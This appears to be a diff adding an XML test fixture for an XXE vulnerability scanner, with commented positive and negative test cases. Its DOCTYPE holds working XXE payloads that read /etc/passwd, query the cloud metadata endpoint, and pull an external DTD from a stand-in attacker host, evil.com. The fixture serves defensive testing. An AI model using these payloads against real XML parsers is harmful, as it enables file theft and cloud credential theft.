@@ -1,0 +1,18 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!-- TC-XXE-01: POSITIVE — local file read -->
+<!-- TC-XXE-02: POSITIVE — external URL (SSRF) -->
+<!-- TC-XXE-03: POSITIVE — parameter entity (OOB exfil) -->
+<!-- TC-XXE-04: POSITIVE — external DTD -->
+<!-- TC-XXE-05: POSITIVE — custom entity reference -->
+<!-- TC-XXE-06: NEGATIVE — standard XML entities only -->
+<!-- TC-XXE-07: tested in separate clean file -->
+<!DOCTYPE test [
+    <!ENTITY xxe SYSTEM "file:///etc/passwd">
+    <!ENTITY ssrf SYSTEM "http://169.254.169.254/latest/meta-data/">
+    <!ENTITY % oob SYSTEM "http://evil.com/exfil.dtd">
+]>
+<root>
+    <secret>&xxe;</secret>
+    <cloud>&ssrf;</cloud>
+    <safe>This uses &amp; and &lt; which are standard entities</safe>
+</root>
